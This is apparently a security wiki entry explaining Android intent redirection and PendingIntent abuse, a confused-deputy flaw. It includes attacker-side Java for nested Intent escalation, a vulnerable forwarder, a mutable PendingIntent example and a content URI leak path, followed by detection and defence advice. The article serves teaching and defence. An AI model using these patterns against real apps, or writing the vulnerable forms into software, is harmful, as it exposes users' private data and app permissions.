---
title: Android Intent Redirection and PendingIntent Abuse
slug: android-intent-redirection
---

> **TL;DR:** Confused-deputy bugs in Android arise when an exported component blindly forwards a caller-supplied Intent, PendingIntent, or content URI, granting the attacker the host app's permissions and identity.

## What it is
Intent redirection turns a privileged app into a proxy: an attacker app sends an Intent containing a nested Intent (or a mutable PendingIntent) to an exported activity or service, which then `startActivity()`s or `send()`s the attacker-controlled payload. Variants include PendingIntent reuse (mutable + base Intent unset), deep-link redirection through trusted browsers, and `ContentProvider.grantUriPermission()` abuse to leak private files.

## Preconditions / where it applies
- Android target SDK <= 33 for implicit mutable PendingIntents (Android 14 tightens defaults)
- A host app with an exported activity, service, or broadcast receiver that forwards Intents
- Or an app that creates `PendingIntent.getActivity(..., FLAG_MUTABLE)` with an empty base Intent
- For ContentProvider abuse: a provider that calls `grantUriPermission` on caller-supplied URIs

## Technique
Trigger a vulnerable forwarder and a mutable PendingIntent.

```java
// Attacker side: nested Intent escalation
Intent inner = new Intent();
inner.setClassName("com.victim", "com.victim.PrivateActivity");
inner.putExtra("uid", 0);

Intent outer = new Intent("com.victim.action.PROXY");
outer.setPackage("com.victim");
outer.putExtra("forward", inner);   // victim will startActivity(forward)
startActivity(outer);

// Vulnerable host (simplified)
Intent forward = getIntent().getParcelableExtra("forward");
startActivity(forward);             // confused-deputy: runs as victim
```

```java
// Mutable PendingIntent the attacker can fill in
PendingIntent pi = PendingIntent.getActivity(
    ctx, 0, new Intent(),           // empty base intent
    PendingIntent.FLAG_MUTABLE);    // attacker controls action + extras
notification.addAction(R.drawable.ic, "Tap", pi);
```

For ContentProvider leaks, request `Intent.FLAG_GRANT_READ_URI_PERMISSION` on a `content://com.victim.files/private/secret.txt` URI passed through the forwarder.

## Detection and defence
- App-side: set `android:exported="false"` where possible; validate `ComponentName` and package on any forwarded Intent
- App-side: use `FLAG_IMMUTABLE` for every PendingIntent and supply a fully populated base Intent
- Detection: lint checks (`UnsafeImplicitIntentLaunch`, `MutablePendingIntent`) and Play Console pre-launch reports flag the pattern; runtime AppOps logs unusual cross-package activity starts

## References
- [Android developer guide: Intent redirection](https://developer.android.com/privacy-and-security/risks/intent-redirection) — official mitigation guidance
- [Android developer guide: PendingIntent mutability](https://developer.android.com/guide/components/intents-filters#PendingIntentMutabilityFlag) — FLAG_MUTABLE/IMMUTABLE rules

See also: [[android-components]], [[android-deeplink-abuse]], [[android-manifest-analysis]].
